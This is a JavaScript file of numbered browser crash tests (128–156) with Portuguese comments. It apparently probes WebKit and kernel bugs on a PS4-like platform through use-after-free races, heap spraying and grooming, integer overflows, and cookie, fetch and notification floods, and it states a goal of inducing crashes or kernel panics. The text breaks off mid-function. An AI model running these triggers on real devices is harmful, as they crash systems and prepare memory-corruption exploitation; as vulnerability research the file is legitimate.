// Vetor Exclusivo: CSS Font Loading API.
// Lógica: Adiciona uma fonte customizada, força o carregamento, e destrói o contexto
// (iframe) que detém a fonte antes do callback de 'load' ser disparado.
function runTest128() {
    log("128. FontFace Race...");
    var f = document.createElement('iframe');
    document.body.appendChild(f);
    
    var doc = f.contentDocument;
    // Cria uma fonte com dados inválidos/lentos
    var font = new FontFace('Crash', 'url(data:font/woff;base64,AAA...)');
    
    doc.fonts.add(font);
    
    font.load().then(function() {
        log("Font loaded (Unexpected)");
    }).catch(function(e) {
        log("Font failed safely: " + e);
    });
    
    // Race loop
    var i = 0;
    var t = setInterval(function() {
        i++;
        // Solicita status repetidamente
        var status = font.status;
        
        if (i === 10) {
            // Destrói o documento dono da fonte enquanto o loader trabalha em background
            document.body.removeChild(f);
            
            // Spray de memória
            var junk = new Array(1000).fill("FONT_FREE");
        }
        
        if (i > 50) {
            clearInterval(t);
            log("Success: Cycle complete");
        }
    }, 5);
}

// 129. Comment Node Normalize Corruption (WebKit)
// Vetor Exclusivo: Node.normalize() em Comentários.
// Lógica: Cria nós de comentário adjacentes. 'normalize()' deve fundi-los.
// Modificamos a árvore DOM (removendo um nó) DENTRO de um iterador que percorre esses nós,
// tentando confundir o algoritmo de fusão.
function runTest129() {
    log("129. Comment Normalize...");
    var div = document.createElement('div');
    var c1 = document.createComment("Part1");
    var c2 = document.createComment("Part2");
    var c3 = document.createComment("Part3");
    
    div.appendChild(c1);
    div.appendChild(c2);
    div.appendChild(c3);
    document.body.appendChild(div);
    
    // Mutation observer para pegar a fusão
    var obs = new MutationObserver(function(mutations) {
        // Quando o normalize tenta fundir c1 e c2...
        if (div.contains(c3)) {
            // Removemos c3 abruptamente, alterando o length da lista de filhos
            div.removeChild(c3);
            // Adicionamos lixo para mover a memória
            div.appendChild(document.createElement('span'));
        }
    });
    
    obs.observe(div, {childList: true});
    
    try {
        div.normalize();
        log("Success: Normalize finished. Child nodes: " + div.childNodes.length);
    } catch(e) { log("Fail: " + e); }
}

// 130. FormData Filename Overflow Panic (Kernel)
// Vetor Exclusivo: Multipart Header Generation.
// Lógica: O Kernel precisa gerar headers "Content-Disposition" para uploads.
// Criamos um nome de arquivo virtualmente infinito. Ao tentar construir o pacote de rede,
// o buffer do kernel para o header pode estourar.
function runTest130() {
    log("130. FormData Overflow...");
    var fd = new FormData();
    var content = new Blob(["test"]);
    
    // Cria um nome de arquivo monstruoso (1MB de string)
    // O limite típico de header é 4KB-16KB.
    var hugeName = "A".repeat(1024 * 1024); 
    
    fd.append("file", content, hugeName);
    
    var xhr = new XMLHttpRequest();
    xhr.open("POST", "/dev/null", true);
    
    try {
        xhr.send(fd);
        log("Success: Send triggered (Check for Panic)");
        
        // Aborta rápido para forçar limpeza de mbufs gigantes
        setTimeout(function() { xhr.abort(); }, 10);
    } catch(e) {
        log("Fail: JS blocked request: " + e);
    }
}

// 131. Microtask Queue Watchdog Timeout (Kernel)
// Vetor Exclusivo: Event Loop Starvation via MessageChannel.
// Lógica: Microtasks (Promises/MessageChannel) têm prioridade sobre renderização.
// Enfileiramos milhões de microtasks síncronas. O Kernel Watchdog pode detectar que
// a thread de UI travou e causar um panic por "Soft Lockup".
function runTest131() {
    log("131. Microtask Flood...");
    var channel = new MessageChannel();
    var port = channel.port2;
    var count = 0;
    
    channel.port1.onmessage = function() {
        count++;
        // Reagendamento infinito na microtask queue
        // Isso bloqueia a renderização e I/O, mas mantem a CPU em 100%
        if (count < 1000000) {
            port.postMessage(null);
        } else {
            log("Success: 1M microtasks dispatched");
        }
    };
    
    // Gatilho inicial
    port.postMessage(null);
    
    // Adiciona pressão de memória externa
    var i = setInterval(function() {
        var arr = new Uint8Array(1024 * 1024);
    }, 100);
    
    setTimeout(function() { clearInterval(i); }, 5000);
}

// 132. Recursive Blob URL Stack Smash (Kernel)
// Vetor Exclusivo: VFS Recursion Limit.
// Lógica: Diferente de aninhar Blobs (que é suportado), aninhamos URLs.
// Criamos um Blob que contém texto apontando para a URL de outro Blob.
// O navegador pode tentar fazer "sniffing" de conteúdo ou pré-visualização.
function runTest132() {
    log("132. Blob URL Stack...");
    var urls = [];
    var lastUrl = "start";
    
    try {
        // Cria uma cadeia profunda de referências cruzadas
        for(var i=0; i<3000; i++) {
            var content = "MIME-Type-Check: " + lastUrl;
            var b = new Blob([content], {type: "text/plain"});
            var u = URL.createObjectURL(b);
            urls.push(u);
            lastUrl = u;
        }
        
        // Solicita leitura do topo da pilha via XHR
        // Se o sistema de arquivos tentar verificar a cadeia de dependência...
        var xhr = new XMLHttpRequest();
        xhr.open("GET", lastUrl, true);
        xhr.send();
        
        log("Success: Chain created. Length: " + urls.length);
        
        // Limpeza em massa (Stress test para o VFS cleaner)
        setTimeout(function() {
            urls.forEach(function(u) { URL.revokeObjectURL(u); });
            log("Revoked all URLs");
        }, 2000);
    } catch(e) { log("Fail: " + e); }
}
// 133. WeakMap Key GC Re-entry UAF (WebKit)
// Vetor Exclusivo: Garbage Collection Internals.
// Lógica: WeakMaps mantêm referências fracas. Criamos chaves, associamos valores,
// e forçamos pressão de memória. O objetivo é acessar o WeakMap no momento exato
// em que o Coletor de Lixo (GC) está marcando os objetos como mortos.
function runTest133() {
    log("133. WeakMap GC...");
    var wm = new WeakMap();
    var keys = [];
    
    try {
        // Cria 10.000 chaves efêmeras
        for(var i=0; i<10000; i++) {
            var k = {id: i};
            wm.set(k, {data: new Uint8Array(1024)});
            if(i % 100 === 0) keys.push(k); // Mantém algumas vivas
        }
        
        // Pressiona o GC alocando arrays grandes e descartando
        var pressure = [];
        for(var j=0; j<500; j++) pressure.push(new ArrayBuffer(1024 * 1024));
        pressure = null; // Trigger GC hint
        
        // Acesso imediato: O motor deve verificar a liveness de 'keys'
        // Se o GC interrompeu e limpou parte do mapa, o lookup pode falhar ou crashar
        var check = wm.get(keys[0]);
        log("Success: Retrieved value: " + (check ? "Yes" : "No"));
        
        keys = null; // Limpa tudo
    } catch(e) {
        log("Fail: " + e);
    }
}

// 134. ResizeObserver Callback Detach Race (WebKit)
// Vetor Exclusivo: ResizeObserver Layout Loop.
// Lógica: O ResizeObserver notifica mudanças de tamanho. Dentro do callback,
// removemos o elemento observado do DOM e forçamos um layout síncrono.
// O WebKit tenta continuar o loop de notificação em um nó desconectado.
function runTest134() {
    log("134. ResizeObserver...");
    if(!window.ResizeObserver) { log("Fail: API missing"); return; }
    
    var div = document.createElement('div');
    document.body.appendChild(div);
    div.style.width = "100px";
    
    var ro = new ResizeObserver(function(entries) {
        // Callback crítico
        try {
            document.body.removeChild(div);
            // Força RecalculateStyle em nó órfão
            var h = div.offsetHeight;
            // Cria lixo para reocupar memória
            var junk = new Array(1000).fill(1.1);
            log("Callback executed. Height: " + h);
        } catch(e) { log("Observer Error: " + e); }
    });
    
    try {
        ro.observe(div);
        // Dispara mudança
        div.style.width = "200px";
    } catch(e) { log("Fail: " + e); }
}

// 135. DOMMatrix Singular Inversion Crash (WebKit)
// Vetor Exclusivo: Geometry Interfaces / Math.
// Lógica: Cria uma matriz singular (não inversível) ou com valores extremos (Infinity/NaN).
// Tenta inverter ou multiplicar a matriz e aplicá-la a um elemento via CSSOM.
// Erros de ponto flutuante podem corromper a stack de renderização.
function runTest135() {
    log("135. DOMMatrix Math...");
    try {
        var m = new WebKitCSSMatrix(); // Legacy interface comum no PS4
        
        // Configura matriz singular (determinante 0)
        m.a = 1; m.b = 2;
        m.c = 2; m.d = 4; 
        m.e = 1e308; // Valor extremo
        
        // Operações pesadas
        for(var i=0; i<100; i++) {
            // Tenta inverter matriz impossível
            try { 
                var inv = m.inverse(); 
                m = m.multiply(inv);
            } catch(z) {
                // Se falhar, tenta corromper com NaN
                m.a = NaN;
            }
        }
        
        var el = document.createElement('div');
        el.style.transform = m.toString();
        document.body.appendChild(el);
        log("Success: Matrix applied: " + el.style.transform.substring(0, 20) + "...");
        document.body.removeChild(el);
    } catch(e) {
        log("Fail: " + e);
    }
}

// 136. IndexedDB Transaction Commit/Abort Race (Kernel)
// Vetor Exclusivo: IPC / SQLite Backing Store.
// Lógica: IndexedDB roda em processo separado. Abrimos uma transação, escrevemos dados,
// e abortamos a transação enquanto tentamos deletar o banco de dados inteiro simultaneamente.
// Isso causa contenção no arquivo de lock do banco de dados no sistema de arquivos.
function runTest136() {
    log("136. IndexedDB Race...");
    var request = indexedDB.open("CrashDB", 1);
    
    request.onupgradeneeded = function(e) {
        var db = e.target.result;
        db.createObjectStore("store");
    };
    
    request.onsuccess = function(e) {
        var db = e.target.result;
        var t = setInterval(function() {
            try {
                var tx = db.transaction(["store"], "readwrite");
                var store = tx.objectStore("store");
                // Escreve blob grande
                store.put(new Uint8Array(1024*1024), "key");
                
                // Race: Aborta transação
                tx.abort();
                
                // Race: Deleta DB ao mesmo tempo
                indexedDB.deleteDatabase("CrashDB");
            } catch(z) {}
        }, 10);
        
        setTimeout(function() {
            clearInterval(t);
            db.close();
            log("Success: IDB Race cycles complete");
        }, 3000);
    };
    
    request.onerror = function(e) { log("IDB Error: " + e); };
}

// 137. SVG Filter DisplacementMap Buffer Overflow (Kernel/GPU)
// Vetor Exclusivo: SVG Filters.
// Lógica: O filtro `feDisplacementMap` usa valores de pixel de uma imagem para mover pixels de outra.
// Usamos uma escala (scale) extrema e imagens de tamanho 0x0 ou muito grandes.
// Isso tenta forçar leitura de memória de vídeo fora dos limites (OOB Read) durante o rasterize.
function runTest137() {
    log("137. SVG Filter OOB...");
    var svg = document.createElementNS("http://www.w3.org/2000/svg", "svg");
    var filter = document.createElementNS("http://www.w3.org/2000/svg", "filter");
    filter.id = "displace";
    
    var fe = document.createElementNS("http://www.w3.org/2000/svg", "feDisplacementMap");
    fe.setAttribute("scale", "100000"); // Escala massiva
    fe.setAttribute("xChannelSelector", "R");
    
    filter.appendChild(fe);
    svg.appendChild(filter);
    
    // Imagem alvo (Canvas convertido para DataURL)
    var img = document.createElementNS("http://www.w3.org/2000/svg", "image");
    img.setAttribute("filter", "url(#displace)");
    img.setAttribute("width", "500");
    img.setAttribute("height", "500");
    
    svg.appendChild(img);
    document.body.appendChild(svg);
    
    // Força renderização e altera parâmetros dinamicamente
    var i = setInterval(function() {
        fe.setAttribute("scale", Math.random() * 1000000);
        // Tenta invalidar a fonte do filtro
        fe.in1 = null; 
    }, 20);
    
    setTimeout(function() {
        clearInterval(i);
        document.body.removeChild(svg);
        log("Success: SVG Filter stress test");
    }, 3000);
}

// 138. Cookie Header Mbuf Exhaustion (Kernel)
// Vetor Exclusivo: HTTP Header Parsing / Network Stack.
// Lógica: Cookies são enviados em todos os requests HTTP no header "Cookie".
// Criamos milhares de cookies até o limite do browser, depois disparamos um XHR.
// O Kernel precisa alocar uma cadeia de "mbufs" (memory buffers de rede) para segurar o cabeçalho gigante.
function runTest138() {
    log("138. Cookie Flood...");
    
    // 1. Enche o jar de cookies
    try {
        for(var i=0; i<200; i++) {
            // Cookies grandes (4KB cada aprox)
            var val = "X".repeat(4000);
            document.cookie = "c" + i + "=" + val + "; path=/";
        }
        log("Cookies set. Total header size ~800KB");
        
        // 2. Dispara request que obriga o kernel a montar o pacote
        var xhr = new XMLHttpRequest();
        xhr.open("GET", "/dummy_cookie_check", true);
        xhr.send();
        
        xhr.onreadystatechange = function() {
            if(xhr.readyState === 4) log("Success: Request sent (Status: " + xhr.status + ")");
        };
        
        // Limpeza (opcional, para não quebrar sessões futuras, mas aqui queremos crash)
        // setTimeout(() => { document.cookie.split(";").forEach(c => document.cookie = c.replace(/^ +/, "").replace(/=.*/, "=;expires=" + new Date().toUTCString() + ";path=/")); }, 5000);
        
    } catch(e) {
        log("Fail: " + e);
    }
}
// 139. Array.reverse Accessor Mutator (WebKit)
// Vetor Exclusivo: Array Built-ins.
// Lógica: O método reverse() itera sobre o array trocando elementos.
// Definimos um 'getter' em um dos índices. Quando o algoritmo C++ lê esse índice
// para fazer a troca, nós alteramos o tamanho do array (length = 0), invalidando a memória
// que o algoritmo pretendia acessar para o destino da troca.
function runTest139() {
    log("139. Array Reverse...");
    try {
        var arr = [1, 2, 3, 4];
        var view = new Uint8Array(1024); // Spray memory helper
        
        Object.defineProperty(arr, '0', {
            get: function() {
                // Mutação destrutiva durante a operação interna
                arr.length = 0;
                // Preenche o heap liberado
                for(var i=0; i<100; i++) view[i] = 0x41;
                return 100;
            },
            set: function(v) { return v; }
        });
        
        // Dispara o algoritmo de reversão
        arr.reverse();
        
        log("Success: Array survived reverse. Len: " + arr.length);
    } catch(e) {
        log("Fail: " + e);
    }
}

// 140. DOMParser XML Recursive Entity (WebKit)
// Vetor Exclusivo: XML Parser Logic.
// Lógica: Tenta parsear uma string XML com entidades aninhadas ou profundidade extrema.
// Embora "Billion Laughs" seja bloqueado, a recursão de tags simples em um parser síncrono
// pode estourar a pilha do WebKit se não houver verificação de profundidade estrita.
function runTest140() {
    log("140. XML Recursion...");
    var parser = new DOMParser();
    var depth = 5000;
    var xml = "";
    
    // Constrói XML: <a><b><c>...</c></b></a>
    for(var i=0; i<depth; i++) xml += "<x" + i + ">";
    xml += "payload";
    for(var i=depth-1; i>=0; i--) xml += "</x" + i + ">";
    
    try {
        var doc = parser.parseFromString(xml, "text/xml");
        
        // Acessa o elemento mais profundo para garantir que a árvore foi construída
        var root = doc.documentElement;
        var leaf = root;
        var count = 0;
        while(leaf.firstElementChild) {
            leaf = leaf.firstElementChild;
            count++;
        }
        
        log("Success: Parsed depth: " + count);
    } catch(e) {
        log("Fail: " + e);
    }
}

// 141. NodeIterator Filter Detach UAF (WebKit)
// Vetor Exclusivo: DOM Traversal Filters.
// Lógica: Usa um NodeIterator com um filtro customizado. O filtro é chamado para cada nó.
// Dentro do filtro, removemos o nó sendo visitado (ou seu pai) do DOM.
// O iterador C++ tenta continuar a partir de um ponteiro "dirty".
function runTest141() {
    log("141. Iterator Detach...");
    var root = document.createElement('div');
    var p = document.createElement('p');
    var s = document.createElement('span');
    p.appendChild(s);
    root.appendChild(p);
    
    var iter = document.createNodeIterator(root, NodeFilter.SHOW_ELEMENT, {
        acceptNode: function(node) {
            if(node === s) {
                // Remove o nó PAI enquanto visita o filho
                if(root.contains(p)) root.removeChild(p);
                // Alocação de lixo
                var junk = new Array(500).fill(1.234);
                return NodeFilter.FILTER_ACCEPT;
            }
            return NodeFilter.FILTER_ACCEPT;
        }
    });
    
    try {
        var n;
        var count = 0;
        while((n = iter.nextNode())) {
            count++;
            if(n === s) n.textContent = "visited";
        }
        log("Success: Iteration safe. Nodes visited: " + count);
    } catch(e) {
        log("Fail: " + e);
    }
}

// 142. AudioContext Decode Buffer Race (Kernel/Driver)
// Vetor Exclusivo: Audio DSP Thread.
// Lógica: `decodeAudioData` decodifica MP3/AAC em thread separada.
// Passamos um ArrayBuffer para decodificar e imediatamente o transferimos (neuter)
// para um Worker, esvaziando-o na thread principal enquanto o codec de áudio tenta ler.
function runTest142() {
    log("142. Audio Decode Race...");
    try {
        var ctx = new (window.AudioContext || window.webkitAudioContext)();
        // Cria "áudio" fake (ruído aleatório)
        var buffer = new ArrayBuffer(1024 * 1024);
        var view = new Uint8Array(buffer);
        for(var i=0; i<view.length; i++) view[i] = Math.random() * 255;
        
        // Inicia decodificação
        var p = ctx.decodeAudioData(buffer, 
            function(decoded) { log("Decode finished (Unexpected)"); },
            function(e) { log("Decode failed safely"); }
        );
        
        // Race: Detona o buffer fonte imediatamente
        var w = new Worker(URL.createObjectURL(new Blob([''],{type:'text/javascript'})));
        w.postMessage(buffer, [buffer]); // Transferência destrutiva
        w.terminate();
        
        log("Success: Race triggered (Check kernel logs)");
    } catch(e) {
        log("Fail: " + e);
    }
}

// 143. Window.name IPC Buffer Overflow (Kernel)
// Vetor Exclusivo: Window Manager IPC.
// Lógica: `window.name` é persistente e compartilhado. Em alguns sistemas, ele é armazenado
// em buffers de tamanho fixo no gerenciador de janelas.
// Atribuímos uma string massiva repetidamente para tentar estourar esse buffer de transporte.
function runTest143() {
    log("143. Window.name Overflow...");
    var huge = "X".repeat(1024 * 1024 * 5); // 5MB String
    var original = window.name;
    
    try {
        // Tenta setar e ler rapidamente
        for(var i=0; i<10; i++) {
            window.name = huge + i;
            if(window.name.length !== huge.length + 1) {
                throw "Mismatch";
            }
        }
        window.name = original; // Restore
        log("Success: Window name handled 5MB payload");
    } catch(e) {
        log("Fail: " + e);
    }
}

// 144. ImageData Constructor Int Overflow (Kernel)
// Vetor Exclusivo: Graphics Memory Allocation.
// Lógica: O construtor `ImageData` aceita largura e altura. Internamente calcula `w * h * 4`.
// Usamos valores que resultam em um número maior que MAX_INT (2^31 - 1) ou MAX_UINT (2^32 - 1).
// Se o cálculo "wrap around" (voltar a zero), o sistema pode alocar pouca memória e escrever muito.
function runTest144() {
    log("144. ImageData Overflow...");
    try {
        // Valores específicos para causar overflow em multiplicação de 32-bit
        // Ex: 32768 * 32768 * 4 = 4,294,967,296 (0 em 32-bit)
        var w = 65536; 
        var h = 65536;
        
        // Tenta criar ImageData com dimensões absurdas
        // Em um sistema seguro, isso deve lançar exceção imediatamente.
        // Em um sistema vulnerável, pode travar o kernel ou o compositor gráfico.
        var img = new ImageData(w, h);
        
        log("Success: ImageData created (Dangerous! Size: " + img.data.byteLength + ")");
    } catch(e) {
        log("Fail: " + e); // Esperado: "IndexSizeError" ou OOM
    }
}
// 145. SVG Use Element Shadow Tree UAF (WebKit)
// Vetor Exclusivo: SVG <use> Cloning Logic.
// Lógica: O elemento <use> clona o elemento referenciado em uma "Shadow Tree" fechada.
// Criamos um ciclo onde o elemento referenciado se modifica (remove filhos) 
// exatamente quando o <use> está tentando cloná-lo para renderização.
function runTest145() {
    log("145. SVG Use UAF...");
    var svg = document.createElementNS("http://www.w3.org/2000/svg", "svg");
    var defs = document.createElementNS("http://www.w3.org/2000/svg", "defs");
    var g = document.createElementNS("http://www.w3.org/2000/svg", "g");
    g.id = "target";
    
    // Adiciona conteúdo complexo para clonar
    for(var i=0; i<100; i++) {
        var r = document.createElementNS("http://www.w3.org/2000/svg", "rect");
        g.appendChild(r);
    }
    defs.appendChild(g);
    svg.appendChild(defs);
    
    var use = document.createElementNS("http://www.w3.org/2000/svg", "use");
    use.setAttributeNS("http://www.w3.org/1999/xlink", "href", "#target");
    svg.appendChild(use);
    document.body.appendChild(svg);
    
    try {
        // Observer dispara durante a clonagem da shadow tree?
        var obs = new MutationObserver(function() {
            // Remove o conteúdo original enquanto o 'use' tenta desenhá-lo
            g.innerHTML = "";
            var junk = new Array(500).fill(1); // Heap grooming
        });
        obs.observe(use, {attributes: true, attributeFilter: ['x']});
        
        // Dispara update
        use.setAttribute("x", "10");
        
        log("Success: SVG Use updated. Shadow tree state: " + (use.instanceRoot ? "Built" : "Null"));
    } catch(e) {
        log("Fail: " + e);
    }
}

// 146. Location AncestorOrigins Iterator Crash (WebKit)
// Vetor Exclusivo: DOMStringList (ReadOnly).
// Lógica: `location.ancestorOrigins` é uma lista de strings de origens de iframes.
// Criamos iframes aninhados, acessamos a lista, e removemos os iframes.
// Tentamos acessar um índice da lista que agora aponta para uma origem destruída.
function runTest146() {
    log("146. AncestorOrigins...");
    var f = document.createElement('iframe');
    document.body.appendChild(f);
    
    try {
        var origins = f.contentWindow.location.ancestorOrigins;
        // Acesso inicial para cachear
        var len = origins.length;
        
        if (origins.length > 0) {
            var item = origins[0];
            
            // Destroi o contexto
            document.body.removeChild(f);
            
            // Tenta acessar a lista "morta"
            // Em implementações antigas, o objeto DOMStringList sobrevivia mas apontava para memória inválida
            var zombie = origins[0];
            
            log("Success: Retrieved origin: " + zombie);
        } else {
            log("Info: ancestorOrigins empty (Single frame)");
            document.body.removeChild(f);
        }
    } catch(e) {
        log("Fail: " + e);
    }
}

// 147. FormControls NamedGetter Cache Poison (WebKit)
// Vetor Exclusivo: HTMLFormControlsCollection.
// Lógica: Formulários permitem acessar inputs por nome (form.myInput).
// O WebKit cacheia esse acesso. Trocamos o nome do input e removemos ele do DOM,
// depois tentamos acessar a propriedade cacheada no formulário.
function runTest147() {
    log("147. Form Getter...");
    var f = document.createElement('form');
    document.body.appendChild(f);
    var i = document.createElement('input');
    i.id = "victim";
    f.appendChild(i);
    
    try {
        // 1. Aquece o cache de propriedade
        var ref1 = f.victim;
        
        // 2. Invalida o cache de forma complexa
        i.id = "safe";
        f.removeChild(i);
        
        // 3. Adiciona elemento colisor para confundir o lookup
        var div = document.createElement('div');
        div.id = "victim"; // Mesmo ID, mas não é form control
        document.body.appendChild(div); // Fora do form
        
        // 4. Acessa novamente. O motor deve revalidar.
        var ref2 = f.victim;
        
        log("Success: Reference is: " + ref2); // Deve ser undefined ou colidir
    } catch(e) {
        log("Fail: " + e);
    }
}

// 148. HRTF Panner Database Loader Panic (Kernel)
// Vetor Exclusivo: WebAudio HRTF (Head-Related Transfer Function).
// Lógica: O modo 'HRTF' do PannerNode exige que o Kernel/AudioServer carregue
// arquivos de banco de dados de resposta ao impulso do disco.
// Criar e destruir esses nós rapidamente estressa o I/O de áudio e mapeamento de memória do kernel.
function runTest148() {
    log("148. HRTF Panic...");
    if(!window.AudioContext && !window.webkitAudioContext) { log("No WebAudio"); return; }
    
    var ctx = new (window.AudioContext || window.webkitAudioContext)();
    var panners = [];
    
    var i = setInterval(function() {
        try {
            var p = ctx.createPanner();
            // Esta propriedade dispara o carregamento do banco de dados HRTF
            p.panningModel = 'HRTF';
            p.distanceModel = 'inverse';
            p.connect(ctx.destination);
            
            panners.push(p);
            
            // Limpa para forçar unload do recurso no kernel
            if(panners.length > 20) {
                var old = panners.shift();
                old.disconnect();
                old = null;
            }
        } catch(e) {}
    }, 20); // 50Hz creation rate
    
    setTimeout(function() {
        clearInterval(i);
        if(ctx.close) ctx.close();
        log("Success: HRTF cycle completed");
    }, 4000);
}

// 149. Notification IPC Body Flood (Kernel)
// Vetor Exclusivo: System Notifications IPC.
// Lógica: O navegador envia dados de notificação para o processo Shell/UI do OS.
// Enviamos corpos de texto massivos. O buffer de IPC entre o WebKit e o Shell
// pode não verificar o tamanho corretamente, causando corrupção no processo do sistema.
function runTest149() {
    log("149. Notification Flood...");
    if(!window.Notification) { log("No Notification API"); return; }
    
    var hugeBody = "A".repeat(1024 * 1024); // 1MB text
    var count = 0;
    
    var i = setInterval(function() {
        try {
            // Não pedimos permissão, apenas instanciamos o objeto.
            // A validação de permissão ocorre, mas a alocação da string também.
            new Notification("CrashTest", {
                body: hugeBody,
                data: { id: Math.random() }, // Objeto extra para serializar
                tag: "tag" + count
            });
            count++;
        } catch(e) {
            // Ignora erro de permissão, o foco é a alocação pré-check
        }
        
        if(count > 50) {
            clearInterval(i);
            log("Success: 50MB of notifications allocated");
        }
    }, 50);
}

// 150. File LastModified Timestamp Overflow (Kernel)
// Vetor Exclusivo: Virtual File System Metadata.
// Lógica: O construtor `File` aceita metadados. Passamos um timestamp `lastModified`
// que excede o valor máximo de inteiro com sinal de 32/64 bits.
// O Kernel pode tentar converter isso para uma estrutura de tempo do sistema e falhar/wrap.
function runTest150() {
    log("150. File Time Overflow...");
    try {
        var content = ["test"];
        // Max Int64 aprox 9e18. Passamos 1e30.
        // O Kernel espera milissegundos, mas números float gigantes perdem precisão
        // e podem virar valores negativos ou infinitos na conversão para int.
        var badTime = 1e25; 
        
        var f = new File(content, "overflow.txt", {
            type: "text/plain",
            lastModified: badTime
        });
        
        // Tenta ler o atributo que o kernel deve ter armazenado
        var stored = f.lastModified;
        
        log("Success: File created. Stored Time: " + stored);
        
        // Operação extra: Slice e leitura para ver se o metadado persiste e quebra o stat()
        var s = f.slice(0, 1);
        
    } catch(e) {
        log("Fail: " + e);
    }
}
// 151. ExecCommand InsertHTML Nesting Smash (WebKit)
// Vetor Exclusivo: Legacy Editing API.
// Lógica: 'execCommand' tenta corrigir o HTML inválido inserido.
// Inserimos HTML com aninhamento profundo e tags quebradas recursivamente.
// O algoritmo de "fixup" do DOM no WebKit pode entrar em loop ou acessar memória inválida.
function runTest151() {
    log("151. Editing Smash...");
    var div = document.createElement('div');
    div.contentEditable = "true";
    document.body.appendChild(div);
    div.focus();
    
    var complexHTML = "<b><i><u><span>test</span></u></i></b>";
    for(var i=0; i<50; i++) complexHTML = "<div>" + complexHTML + "</div>";
    
    try {
        for(var k=0; k<20; k++) {
            // Seleciona tudo
            document.execCommand('selectAll', false, null);
            // Insere HTML complexo sobre a seleção
            document.execCommand('insertHTML', false, complexHTML);
            // Desfaz imediatamente (estressa a pilha de Undo/Redo)
            document.execCommand('undo', false, null);
            
            // Mutação extra: remove filhos aleatórios para corromper a árvore de seleção
            if(div.firstChild) div.removeChild(div.firstChild);
        }
        log("Success: Editing commands survived");
    } catch(e) {
        log("Fail: " + e);
    } finally {
        document.body.removeChild(div);
    }
}

// 152. CSSStyleSheet Recursive Import Bomb (WebKit)
// Vetor Exclusivo: CSS Object Model (CSSOM).
// Lógica: Inserimos uma regra '@import' que aponta para um Blob URL contendo o mesmo CSS.
// O parser CSS tenta resolver a importação recursivamente.
function runTest152() {
    log("152. CSS Recursion...");
    var style = document.createElement('style');
    document.head.appendChild(style);
    var sheet = style.sheet;
    
    // CSS que importa a si mesmo (conceitualmente)
    var cssText = "@import url('data:text/css,.bomb{color:red;}'); .bomb{width:100px;}";
    
    try {
        // Insere regra recursiva múltiplas vezes
        for(var i=0; i<500; i++) {
            // Data URI força o parser a processar uma "nova" folha
            var rule = "@import url('data:text/css," + encodeURIComponent(cssText) + "');";
            sheet.insertRule(rule, 0);
            
            // Acessa cssRules para forçar resolução síncrona
            var len = sheet.cssRules.length;
            
            // Deleta para não explodir memória RAM, queremos estressar o Parser
            if(i % 10 === 0) {
                while(sheet.cssRules.length > 0) sheet.deleteRule(0);
            }
        }
        log("Success: CSS Parser survived loop");
    } catch(e) {
        log("Fail: " + e);
    }
}

// 153. CustomElement Constructor DOM Trap (WebKit)
// Vetor Exclusivo: Custom Elements Lifecycle.
// Lógica: A especificação proíbe modificar o DOM no construtor de um Custom Element.
// Tentamos violar isso criando elementos filhos ou atributos dentro do construtor,
// o que pode deixar o elemento em estado "half-constructed" no motor C++.
function runTest153() {
    log("153. CustomElement Trap...");
    if(!window.customElements) { log("No CustomElements API"); return; }
    
    class TrapElement extends HTMLElement {
        constructor() {
            super();
            try {
                // VIOLAÇÃO: Tenta modificar atributos durante construção
                this.setAttribute("id", "crash");
                // VIOLAÇÃO: Tenta criar shadow root
                this.attachShadow({mode: 'open'});
                // VIOLAÇÃO: Tenta adotar a si mesmo em outro documento
                document.implementation.createHTMLDocument().adoptNode(this);
            } catch(e) {
                // WebKit deve lançar erro, mas a corrupção de estado interno é o alvo
            }
        }
    }
    
    var name = "trap-el-" + Date.now();
    customElements.define(name, TrapElement);
    
    try {
        // Criação massiva
        for(var i=0; i<1000; i++) {
            document.createElement(name);
        }
        log("Success: Elements created safely");
    } catch(e) { log("Fail: " + e); }
}

// 154. MediaSource Buffer Append/Abort Race (Kernel/Media)
// Vetor Exclusivo: Media Source Extensions (MSE).
// Lógica: O driver de mídia do Kernel gerencia buffers de vídeo.
// Anexamos um buffer e chamamos `abort()` no SourceBuffer repetidamente.
// Isso causa interrupções na cópia de memória do userland para o kernel space.
function runTest154() {
    log("154. MSE Race...");
    if(!window.MediaSource) { log("No MediaSource API"); return; }
    
    var ms = new MediaSource();
    var url = URL.createObjectURL(ms);
    var v = document.createElement('video');
    v.src = url;
    
    ms.addEventListener('sourceopen', function() {
        try {
            // Cria buffer para video/mp4 (codec comum PS4)
            var sb = ms.addSourceBuffer('video/mp4; codecs="avc1.42E01E, mp4a.40.2"');
            
            // Buffer fake (apenas lixo, o parser vai falhar, mas a cópia ocorre antes)
            var data = new Uint8Array(1024 * 1024); 
            
            var i = setInterval(function() {
                if(!sb.updating) {
                    try {
                        sb.appendBuffer(data);
                        // Race: Aborta imediatamente
                        sb.abort();
                    } catch(e) {}
                }
            }, 5);
            
            setTimeout(function() {
                clearInterval(i);
                if(ms.readyState === 'open') ms.endOfStream();
                log("Success: MSE Race completed");
            }, 3000);
        } catch(e) { log("MSE Error: " + e); }
    });
}

// 155. Crypto GetRandomValues Page Boundary (Kernel)
// Vetor Exclusivo: RNG Syscall Interface.
// Lógica: `getRandomValues` chama uma syscall do kernel.
// Criamos uma TypedArray que começa exatamente no final de uma página de memória (4KB)
// e termina na próxima, testando se a syscall lida corretamente com buffers não contíguos ou desalinhados.
function runTest155() {
    log("155. Crypto Boundary...");
    if(!window.crypto) { log("No Crypto API"); return; }
    
    // Aloca 2 páginas (8KB)
    var buffer = new ArrayBuffer(8192);
    
    // Cria view que cruza o limite da página (4096)
    // Começa em 4090, comprimento 20 (termina em 4110)
    var view = new Uint8Array(buffer, 4090, 20);
    
    try {
        for(var i=0; i<1000; i++) {
            window.crypto.getRandomValues(view);
            // Verificação básica de sanidade
            if(view[0] === 0 && view[19] === 0) {
                 // Improvável ser tudo zero se RNG funcionou
            }
        }
        log("Success: Syscall handled page crossing. Val: " + view[0]);
    } catch(e) {
        log("Fail: " + e);
    }
}

// 156. Fetch Upload Stream Network Flood (Kernel)
// Vetor Exclusivo: Network Driver Mbufs.
// Lógica: Usa a API `fetch` para enviar um corpo de requisição gigante.
// Em vez de um Blob estático, tentamos enviar dados contínuos para manter
// o driver de rede ocupado alocando buffers de transmissão (tx).
function runTest156() {
    log("156. Fetch Flood...");
    if(!window.fetch) { log("No Fetch API"); return; }
    
    var hugeData = new Uint8Array(1024 * 1024 * 2); // 2MB chunks
    var p = Promise.resolve();
    
    var count = 0;
    function flood() {
        if(count > 50) { log("Success: 100MB uploaded"); return; }
        count++;
        
        // Envia POST
        fetch("/dev/null", {
            method: "POST",
            body: hugeData,
            keepalive: true // Mantém socket aberto no kernel
        }).then(flood).catch(e => {
